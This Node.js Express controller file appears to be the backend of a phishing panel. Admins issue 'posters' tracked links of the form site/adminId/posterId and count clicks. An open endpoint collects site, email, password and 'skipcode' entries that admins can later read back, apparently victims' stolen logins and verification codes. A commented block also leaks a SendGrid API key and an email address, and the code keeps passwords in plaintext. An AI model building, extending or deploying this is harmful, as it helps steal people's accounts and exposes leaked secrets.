
const User = require('../models/User')
const Info = require('../models/Info')
const Link = require('../models/Link')
const Poster = require('../models/Poster')
const Site = require('../models/Site')
const createToken = require('../utils/createToken')
const LinkName = require('../models/LinkName')
const Click = require('../models/Click')


// const {API_KEY}=require('../keys')
// const nodemailer=require('nodemailer');
// const sendgridTransport=require('nodemailer-sendgrid-transport');
// const transporter=nodemailer.createTransport(sendgridTransport({
//     auth:{
//      api_key:"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",
//      api_user:"traviskaterherron@gmail.com"
//     }

// module.exports.signup_post=async(req,res)=>{
//     const {email,password,fullname}=req.body;
//     try{
//         const user=await User.create({
//             email,password,fullname
//         })
//     const token =  cretaetoken(user._id);


//         res.status(200).json({user:user,token:token})

//         res.send("done post")



//     }
//     catch(err){
//         const error=handleerror(err)
//         res.status(422).json({error:error})
//       //   res.send(err.code)
//       }
// }




module.exports.signup_post = async (req, res) => {
    const { username, password, links, adminId, numOfPostersPermission } = req.body;

    try {
        const user = await User.findOne({ username: username })
        if (user) {
            return res.status(400).json({ error: "user exists yes" })

        }
        const foundWithAdminId = await User.findOne({ adminId: adminId })
        if (foundWithAdminId) {
            return res.status(400).json({ error: "id exists" })
        }
        const userCreated = await User.create({
            password,
            username,
            adminId,
            links,
            numOfPostersPermission


        })
        return res.status(200).json({ user: userCreated })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }



}
module.exports.login_post = async (req, res) => {
    const { username, password } = req.body;
    try {
        const user = await User.findOne({ username: username })

        if (user) {
            if (user.password == password) {
                return res.status(200).json({ adminId: user.adminId, username: user.username, id: user._id, admin: user.admin, })

            }
            return res.status(400).json({ error: "Wrong password" })


        }
        else {
            const poster = await Poster.findOne({ username: username })
            if (poster) {
                if (poster.password == password) {
            const poster = await Poster.findOne({ username: username })
            const admin=await User.findOne({ _id: poster.root })
            return res.status(200).json({ username: poster.username, id: poster._id,
                 admin: poster.admin ,adminId:admin.adminId,posterId:poster.posterId})

                }
                return res.status(400).json({ error: "Wrong password" })

            }

        }
        return res.status(400).json({ error: "User not found" })

    } catch (e) {
        res.status(400).json({ error: "not found" })
    }

}


module.exports.skip_code = (req, res) => {
    const { id, skipcode } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {
            skipcode: skipcode
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success: true })
    })

}
module.exports.add_posterNumber = (req, res) => {
    const { username, numberAdd } = req.body;
    Info.findOneAndUpdate({ username: username }, {
        $set: {
            numOfPostersPermission: numberAdd
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })

}



module.exports.add_new_links = (req, res) => {
    const { username, links } = req.body;
    User.findOneAndUpdate({ username: username }, {
        $set: {
            links: links
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })

}











module.exports.info_get = async (req, res) => {

    const { username, id, admin } = req.params
    console.log(username)

    try {

        if (admin) {
            const user = await User.findOne({ _id: id })
                .populate({
                    path: 'posters',
                    model: 'Poster',
                    select: 'username password links ',
                    populate: {
                        path: 'details',
                        model: 'Info',
                        select: 'site email password skipcode',
                    }
                }).sort({ createdAt: -1 })
                .select('posters').populate('posters', 'username password links ')
            return res.status(200).json({ user: user[0] })


        }

        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site email password skipcode').sort({ createdAt: -1 })
        return res.status(200).json({ poster: poster })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


module.exports.poster_add = async (req, res) => {

    const { username, password, links, id, posterId } = req.body


    try {
        const user = await User.findOne({ _id: id })
        const posterExists = await Poster.findOne({ username: username })
        if (posterExists) {
            return res.status(400).json({ error: "username exists" })

        }
        const posterIdExists = await Poster.findOne({ posterId: posterId })
        if (posterIdExists) {
            return res.status(400).json({ error: "Id exists" })

        }
        // const userWithPoster = await User.findOne({ _id: posterIdExists.root })

        // if (userWithPoster._id == posterIdExists.root) {
        //     return res.status(200).json({ success: "same" })

        // }
        if (user.numOfPosters >= user.numOfPostersPermission) {
            return res.status(400).json({ error: "User add limit reached" })

        }
        // links.map(async (item) => {
        //     await LinkName.create({
        //         linkName: item


        //     })

        // })

        const poster = await Poster.create({
            username, password, links, posterId,

            root: user._id


        })
        user.posters.push(poster._id)
        user.numOfPosters = user.numOfPosters + 1
        await user.save();
        return res.status(200).json({ status: "saved" })

    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


module.exports.add_data = async (req, res) => {

    const { adminId, posterId } = req.params
    const { site, email, password, skipcode } = req.body

    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({ posterId: posterId })

        if (userFound && posterFound) {
            const info = await Info.create({
                site, email, password, skipcode,
                poster: posterId,
                root: posterFound._id


            })
            posterFound.details.push(info._id)
            await posterFound.save();
            res.status(200).json({ info: info })

        }
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


module.exports.change_password = async (req, res) => {
    const { user, poster, password } = req.body;
    const filter = { username: poster };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ username: user })
        const posterFound = await Poster.findOne({ username: poster })
        if (userFound && posterFound) {

            await Poster.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });
            res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        res.status(400).json({ e: "error" })


    }




}


module.exports.delete_poster = async (req, res) => {

    const { id } = req.params
    // return res.status(200).json({ status: id })

    try {
        
        const result = await Poster.findByIdAndDelete({ _id: id });
        if (result) {
            return res.status(200).json({ status: "Deleted Successfully" })

        }
        return res.status(200).json({ status: "Not deleted" })

    } catch (err) {
        return res.status(400).json({ status: "Not deleted" })
    }

}

module.exports.link_add = async (req, res) => {

    const { linkName } = req.body

    try {
        const link = await Link.findOne({ linkName: linkName })
        if (link) {
            return res.status(400).json({ e: "exists" })

        }
        const userCtreated = await Info.User({
            linkName


        })
        return res.status(200).json({ status: "created" })

    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

module.exports.link_get = async (req, res) => {

    const { id } = req.params


    try {
        const user = await User.findOne({ _id: id })
        res.status(200).json({ users: user.links })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}




module.exports.all_poster = async (req, res) => {

    const { id } = req.params


    try {

        const data = await User.find({ _id: id })
            .populate({
                path: 'posters',
                model: 'Poster',
                select: 'username password links posterId',

            }).sort({ createdAt: -1 })
        return res.status(200).json({ data: data[0] })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


module.exports.poster_details = async (req, res) => {

    const { id } = req.params


    try {

        const data = await Poster.findOne({ _id: id })
            .select('username password posterId links details')
            .populate('details', 'site email password skipcode').sort({ createdAt: -1 })
        return res.status(200).json({ data: data })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



module.exports.add_site = async (req, res) => {
    const { name } = req.body


    try {
        const sitefound = await Site.findOne({ name: name })
        if (sitefound) {
            return res.status(200).json({ site: "site existes" })

        }

        const site = await Site.create({
            name
        })

        return res.status(200).json({ site: site })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

module.exports.link_details = async (req, res) => {

    const { id,admin} = req.params
    // return res.status(200).json({ data: id, sites: admin })


    try {
if(admin == 1){
       const data = await User.findOne({ _id: id })
        const sites = await Site.find()

        return res.status(200).json({ data: data.links, sites: sites })
    }
    else if(admin == 0){
        // return res.status(200).json({ data: id, sites: admin })

        const data = await Poster.findOne({ _id: id })
        const sites = await Site.find()
        return res.status(200).json({ data: data.links, sites: sites })
    }
        



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



module.exports.site_exist = async (req, res) => {

    const { site, adminId, posterId } = req.params
    const siteName = "https://" + site + "/" + adminId + "/" + posterId
        // return res.status(200).json({ success: siteName })

    try {

        const poster = await Poster.find()
        // return res.status(200).json({ success: poster })
        const arrayNew = []
        const found = poster.map((item) => {
            item.links.map((newitem) => {
                arrayNew.push(newitem)
            })

        })


        if (found) {

            var linKfound = arrayNew.find(function (element) {
                return element == siteName;
            });
            if (linKfound) {
              sitefound = await Click.findOne({site:siteName})
              if(sitefound){
                sitefound.click=sitefound.click+1
                await sitefound.save()
                return res.status(200).json({ success: "exists" })
              }
              const click = await Click.create({
                site:siteName, adminId, posterId ,
                click:1
    
    
            })
                return res.status(200).json({ success: "exists" })

            }
            return res.status(200).json({ success: "not exist" })


        }
        return res.status(200).json({ success: arrayNew })



    }
    catch (e) {
        res.status(400).json({ e: "erro" })
    }

}


module.exports.admin_add_site = async (req, res) => {

    const { username, site } = req.body
    // return res.status(200).json({ success: "username" })


    try {

        const data = await User.findOne({ username: username })
        const linKfound = data.links.find(function (element) {
            return element == site;
        });
        if (linKfound) {
            return res.status(200).json({ success: "exists" })

        }
        data.links.push(site)
        await data.save()
        return res.status(200).json({ success: "saved successfully" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}





module.exports.new_site_add_poster =  (req, res) => {

    const { id, password, links } = req.body
    // const filter = { _id: id };
    // const update = { password: password, links: links };


    Poster.findOneAndUpdate({  _id: id }, {
        $set: {
            password: password, links: links
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: "updated successfully" })
    })
    // try {

    //     await Poster.findOneAndUpdate(filter, update, {
    //         new: true,
    //         upsert: true
    //     });

    //     res.status(200).json({ success: "updated successfully" })


    // } catch (e) {
    //     res.status(400).json({ e: "error" })
    // }

}






module.exports.get_A_poster = async (req, res) => {

    const { id,admin} = req.params

    // return res.status(200).json({ data: id, sites: admin })


    try {
     if(admin){
       const data = await Poster.findOne({ _id: id })
            if(!data){
                return res.status(200).json({ data: "not found"})

            }
            return res.status(200).json({ data:data})

    }
        // return res.status(200).json({ data: id, sites: admin })

        
        return res.status(200).json({ data: data.links, sites: sites })
   
        

    }

    catch (e) {
        res.status(400).json({ e: "error" })
    }

}




// module.exports.signin_post=async(req,res)=>{
//     const {email,password}=req.body;
//     try{
//         const user= await User.login(email,password);
//         const token=cretaetoken(user._id);
//         console.log('yes yes',user)
//         // res.cookie('jwt',token,{httpOnly:true,maxAge:3*24*60*60*1000})
//         // const user= await User.findById(usercreate._id).select("email fullname data account").populate("data","bio gender")

//         res.status(200).json({user:user,token:token})
//       }
//     catch(err){
//         const error=handleerror(err)
//         res.status(422).json({error})
//       //   res.send(err.code)
//       }


//  }

//  module.exports.signin_post=(req,res)=>{
//     const {email,password}=req.body;
//     User.findOne({email:email})
//     .then(user=>{
//         if(!user){
//             return    res.status(422).json({error:"Invalid Email Or Password"})
//         }
//         bcrypt.compare(password,user.password)
//         .then(doMatch=>{
//             if (doMatch){
//                 const token =  cretaetoken(user._id);
//                 res.status(200).json({user:user,token:token})
//             }
//             else{
//                 return    res.status(422).json({error:"Invalid Email Or Password"})
//             }
//         }).catch(err=>{
//             console.log('err')
//         })
//     }).catch(err=>console.log('err'))


//  } 



module.exports.click = async (req, res) => {
    const { adminId,posterId } = req.params


    try {
        const click = await Click.find({ adminId: adminId,posterId:posterId })
        if (click.length > 0) {
            return res.status(200).json({ click: click })

        }

        
        return res.status(400).json({ error: "not found any" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


module.exports.click_for_admin = async (req, res) => {
    const { adminId } = req.params


    try {
        const click = await Click.find({ adminId: adminId})
        if (click.length > 0) {
            return res.status(200).json({ click: click })

        }

        
        return res.status(400).json({ error: "not found any" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

module.exports.pass_change = async (req, res) => {
    const { username ,password} = req.body

    // return res.status(200).json({ success: "changed succesfully" })

    try {
        
            userFound = await User.findOne({username:username})
            if(userFound){
                userFound.password=password
              await userFound.save()
              return res.status(200).json({ success: "changed succesfully" })
            }       

      
     return   res.status(400).json({ e: "user not found" })


    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



